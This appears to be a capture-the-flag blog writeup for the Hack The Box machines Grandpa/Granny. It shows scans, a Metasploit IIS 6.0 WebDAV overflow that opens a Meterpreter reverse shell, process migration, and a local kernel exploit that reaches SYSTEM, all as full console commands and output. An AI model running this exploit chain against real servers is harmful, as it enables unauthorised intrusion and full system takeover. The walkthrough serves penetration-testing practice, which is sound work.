---
layout: post
title: Grandpa/Granny (HTB)
categories:
  - Writeup
---

<br>OS Windows
<br>IP: 10.10.10.14/15 

**Nmap**:-
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nmap -sS -A 10.10.10.15</p>

<p>Starting Nmap 7.50 ( https://nmap.org ) at 2018-02-22 18:56 EST
<br>Nmap scan report for 10.10.10.15
<br>Host is up (0.17s latency).
<br>Not shown: 999 filtered ports
<br>PORT   STATE SERVICE VERSION
<br><font color="BB69EC">80/tcp</font> open  http    <font color="53E100">Microsoft IIS httpd 6.0</font>
<br>| http-methods: 
<br>|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
<br>|_http-server-header: Microsoft-IIS/6.0
<br>|_http-title: Under Construction
<br>| <font color="ffff00">http-webdav-scan</font>: 
<br>|   Server Type: Microsoft-IIS/6.0
<br>|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
<br>|   <font color="ffff00">WebDAV type</font>: Unkown
<br>|   Server Date: Thu, 22 Feb 2018 23:53:57 GMT
<br>|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
<br>Device type: general purpose
<br>Running (JUST GUESSING): Microsoft Windows 2003|XP|2008 (92%)
<br>OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_xp::sp2 <br>cpe:/o:microsoft:windows_server_2008::sp2
<br>Aggressive OS guesses: Microsoft Windows Server 2003 SP1 - SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP <br>SP2 or Windows Server 2003 SP2 (91%), Microsoft Windows Server 2003 R2 SP2 (88%), Microsoft Windows Server 2003 SP1 or R2 (88%), <br>Microsoft Windows 2003 SP2 (86%), Microsoft Windows Server 2003 SP1 or SP2 (86%), Microsoft Windows XP SP2 (86%), Microsoft Windows <br>2003 R2 (86%), Microsoft Windows Server 2003 (86%)
<br>No exact OS matches for host (test conditions non-ideal).
<br>Network Distance: 2 hops
<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>

<p>TRACEROUTE (using port 80/tcp)
<br>HOP RTT       ADDRESS
<br>1   170.45 ms 10.10.14.1
<br>2   170.49 ms 10.10.10.15</p>

<p>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<br>Nmap done: 1 IP address (1 host up) scanned in 38.06 seconds
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>
</div>
</font>

<br>Only port open is open and the web server is IIS httpd 6.0 and webdav is also available in which put method is allowed, and the webpage is also not available.

**Nikto**
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nikto -h 10.10.10.15
<br>- Nikto v2.1.6
<br>---------------------------------------------------------------------------
<br>+ Target IP:          10.10.10.15
<br>+ Target Hostname:    10.10.10.15
<br>+ Target Port:        80
<br>+ Start Time:         2018-02-22 19:01:01 (GMT-5)
<br>---------------------------------------------------------------------------
<br>+ Server: Microsoft-IIS/6.0
<br>+ Retrieved microsoftofficewebserver header: 5.0_Pub
<br>+ Retrieved x-powered-by header: ASP.NET
<br>+ The anti-clickjacking X-Frame-Options header is not present.
<br>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
<br>+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
<br>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
<br>+ Retrieved x-aspnet-version header: 1.1.4322
<br>+ No CGI Directories found (use '-C all' to force check all possible dirs)
<br>+ OSVDB-397: HTTP method <font color="ffff00">'PUT'</font> allows clients to save files on the web server.
<br>+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
<br>+ Retrieved dasl header: <font color="ffff00"> DAV:sql </font>
<br>+ Retrieved dav header: 1, 2
<br>+ Retrieved ms-author-via header: MS-FP/4.0,DAV
<br>+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
<br>+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
<br>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
<br>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
<br>+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
<br>+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
<br>+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
<br>+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
<br>+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
<br>+ WebDAV enabled (UNLOCK PROPPATCH COPY LOCK PROPFIND MKCOL SEARCH listed as allowed)
<br>+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
<br>+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
<br>+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
<br>+ OSVDB-3233: /_vti_bin/shtml.exe/_vti_rpc: FrontPage may be installed.
<br>+ OSVDB-3233: /_private/: FrontPage directory found.
<br>+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
<br>+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
<br>+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
<br>+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
<br>+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST</p>
</div>
</font>

<br>If you google about IIS 6.0 webdav you can find a BOF [exploit](https://www.exploit-db.com/exploits/41738/), and there is a msf module also available for this similar exploit which we are going to use.

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p>msf > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
<br>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > show options </p>

<p>Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):</p>

<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
<br>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
<br>&nbsp;&nbsp;&nbsp;MAXPATHLENGTH&nbsp;&nbsp;60&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End of physical path brute force
<br>&nbsp;&nbsp;&nbsp;MINPATHLENGTH&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Start of physical path brute force
<br>&nbsp;&nbsp;&nbsp;Proxies&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A proxy chain of format type:host:port[,type:host:port][...]
<br>&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target address
<br>&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target port (TCP)
<br>&nbsp;&nbsp;&nbsp;SSL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Negotiate SSL/TLS for outgoing connections
<br>&nbsp;&nbsp;&nbsp;TARGETURI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path of IIS 6 web application
<br>&nbsp;&nbsp;&nbsp;VHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTTP server virtual host</p>


<p>Exploit target:</p>

<p>&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
<br>&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
<br>&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Microsoft Windows Server 2003 R2 SP2 x86</p>


<p>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > set RHOST 10.10.10.15
<br>RHOST => 10.10.10.15
<br>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > exploit </p>

<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.10.*.*:4444 
<br><font color="RoyalBlue">[*]</font> Sending stage (957487 bytes) to 10.10.10.15
<br><font color="RoyalBlue">[*]</font> Meterpreter session 1 opened (10.10.*.*:4444 -> 10.10.10.15:1031) at 2018-02-22 19:23:56 -0500</p>

<p>meterpreter > getuid
<br><font color="red">[-]</font> stdapi_sys_config_getuid: Operation failed: Access is denied.
<br>meterpreter > sysinfo
<br>Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;GRANNY
<br>OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Windows .NET Server (Build 3790, Service Pack 2).
<br>Architecture&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86
<br>System Language&nbsp;:&nbsp;en_US
<br>Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;HTB
<br>Logged On Users&nbsp;:&nbsp;3
<br>Meterpreter&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;x86/windows
<br>meterpreter > </p>
</div>
</font>

<br>We got the session but our sehll has very low privilege not even a user privilege, So first we need to migrate to a process which have some decent privilege and then try to find an exploit using local exploit suggester to escalate our privilege to gain system or administrator level access.

**Privilege Escalation**

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p>meterpreter > ps</p>

<p>Process List
<br>============</p>

<p>&nbsp;PID&nbsp;&nbsp;&nbsp;PPID&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Arch&nbsp;&nbsp;Session&nbsp;&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path
<br>&nbsp;---&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;-------&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----
<br>&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[System Process]                                               
<br>&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System                                                         
<br>&nbsp;260&nbsp;&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;smss.exe                                                       
<br>&nbsp;316&nbsp;&nbsp;&nbsp;260&nbsp;&nbsp;&nbsp;csrss.exe                                                      
<br>&nbsp;340&nbsp;&nbsp;&nbsp;260&nbsp;&nbsp;&nbsp;winlogon.exe                                                   
<br>&nbsp;388&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;services.exe                                                   
<br>&nbsp;400&nbsp;&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;lsass.exe                                                      
<br>&nbsp;568&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;668&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;704&nbsp;&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
<br>&nbsp;728&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;756&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;792&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;928&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;spoolsv.exe                                                    
<br>&nbsp;952&nbsp;&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;msdtc.exe                                                      
<br>&nbsp;1068&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;cisvc.exe                                                      
<br>&nbsp;1112&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;1160&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;inetinfo.exe                                                   
<br>&nbsp;1208&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;1440&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;1572&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;svchost.exe                                                    
<br>&nbsp;1668&nbsp;&nbsp;388&nbsp;&nbsp;&nbsp;alg.exe                                                        
<br>&nbsp;1772&nbsp;&nbsp;568&nbsp;&nbsp;&nbsp;wmiprvse.exe                                                   
<br>&nbsp;1932&nbsp;&nbsp;568&nbsp;&nbsp;&nbsp;davcdata.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT AUTHORITY\NETWORK SERVICE&nbsp;&nbsp;C:\WINDOWS\system32\inetsrv\davcdata.exe
<br>&nbsp;2092&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
<br>&nbsp;2124&nbsp;&nbsp;1068&nbsp;&nbsp;cidaemon.exe                                                   
<br>&nbsp;2204&nbsp;&nbsp;340&nbsp;&nbsp;&nbsp;logon.scr                                                      
<br>&nbsp;3080&nbsp;&nbsp;1440&nbsp;&nbsp;w3wp.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NT AUTHORITY\NETWORK SERVICE&nbsp;&nbsp;c:\windows\system32\inetsrv\w3wp.exe
<br>&nbsp;3172&nbsp;&nbsp;3080&nbsp;&nbsp;rundll32.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x86&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C:\WINDOWS\system32\rundll32.exe</p>

<p>meterpreter > migrate 1932
<br><font color="RoyalBlue">[*]</font> Migrating from 3172 to 1932...
<br><font color="RoyalBlue">[*]</font> Migration completed successfully.
<br>meterpreter > getuid 
<br>Server username: NT AUTHORITY\NETWORK SERVICE
<br>meterpreter > </p>
</div>
</font>

<br>And we successfully migrated to NETWORK SERVICE and now we can run the local exploit suggester.

<font size="1">
<div style="height:200px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p>meterpreter > background 
<br><font color="RoyalBlue">[*]</font> Backgrounding session 1...
<br>msf exploit(<font color="red">iis_webdav_scstoragepathfromurl</font>) > use post/multi/recon/local_exploit_suggester \r
<br>msf post(<font color="red">local_exploit_suggester</font>) > set SESSION 1
<br>SESSION => 1
<br>msf post(<font color="red">local_exploit_suggester</font>) > exploit</p>

<p><font color="RoyalBlue">[*]</font> 10.10.10.15 - Collecting local exploits for x86/windows...
<br><font color="RoyalBlue">[*]</font> 10.10.10.15 - 37 exploit checks are being tried...
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
<br><font color="53E100">[+]</font> 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
<br><font color="RoyalBlue">[*]</font> Post module execution completed
<br>msf post(<font color="red">local_exploit_suggester</font>) ></p>
</div>
</font>

<br>In Suggestion we got couple of exploits which we can use, lets try with the **ms14_058_track_popup_menu**

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p>msf post(<font color="red">local_exploit_suggester</font>) > use exploit/windows/local/ms14_058_track_popup_menu 
<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > show options </p>

<p>Module options (exploit/windows/local/ms14_058_track_popup_menu):</p>

<p>&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
<br>&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
<br>&nbsp;&nbsp;&nbsp;SESSION&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The session to run this module on.</p>


<p>Exploit target:</p>

<p>&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
<br>&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
<br>&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Windows x86</p>


<p>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set SESSION 1
<br>SESSION => 1
<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set payload windows/meterpreter/reverse_tcp
<br>payload => windows/meterpreter/reverse_tcp
<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set LHOST 10.10.*.*
<br>LHOST => 10.10.*.*
<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > set LPORT 444
<br>LPORT => 444
<br>msf exploit(<font color="red">ms14_058_track_popup_menu</font>) > exploit </p>

<p><font color="RoyalBlue">[*]</font> Started reverse TCP handler on 10.10.*.*:444 
<br><font color="RoyalBlue">[*]</font> Launching notepad to host the exploit...
<br><font color="53E100">[+]</font> Process 912 launched.
<br><font color="RoyalBlue">[*]</font> Reflectively injecting the exploit DLL into 912...
<br><font color="RoyalBlue">[*]</font> Injecting exploit into 912...
<br><font color="RoyalBlue">[*]</font> Exploit injected. Injecting payload into 912...
<br><font color="RoyalBlue">[*]</font> Payload injected. Executing exploit...
<br><font color="RoyalBlue">[*]</font> Sending stage (957487 bytes) to 10.10.10.15
<br><font color="53E100">[+]</font> Exploit finished, wait for (hopefully privileged) payload execution to complete.
<br><font color="RoyalBlue">[*]</font> Meterpreter session 2 opened (10.10.*.*:444 -> 10.10.10.15:1031) at 2018-02-22 20:21:02 -0500</p>

<p>meterpreter > getuid 
<br>Server username: NT AUTHORITY\SYSTEM
<br>meterpreter > shell
<br>Process 1660 created.
<br>Channel 1 created.
<br>Microsoft Windows [Version 5.2.3790]
<br>(C) Copyright 1985-2003 Microsoft Corp.</p>

<p>c:\windows\system32\inetsrv>
<br>..
<br>..
<br>C:\Documents and Settings\Lakis\Desktop>type user.txt
<br>type user.txt
<br><font color="53E100">********************************</font>
<br>C:\Documents and Settings\Lakis\Desktop>
<br>..
<br>..
<br>C:\Documents and Settings\Administrator\Desktop>type root.txt
<br>type root.txt
<br><font color="53E100">********************************</font>
<br>C:\Documents and Settings\Administrator\Desktop></p>

</div>
</font>


<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>

